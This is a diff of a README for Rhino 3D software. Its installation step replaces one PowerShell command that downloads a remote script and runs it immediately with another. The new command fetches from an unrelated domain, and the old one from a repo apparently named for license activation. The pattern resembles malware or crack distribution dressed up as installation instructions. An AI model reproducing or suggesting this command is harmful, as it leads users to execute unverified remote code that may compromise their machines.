@@ -13,7 +13,7 @@ Rhino 3D is a versatile NURBS-based modeling application used by designers, arch
 ## Installation
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ---
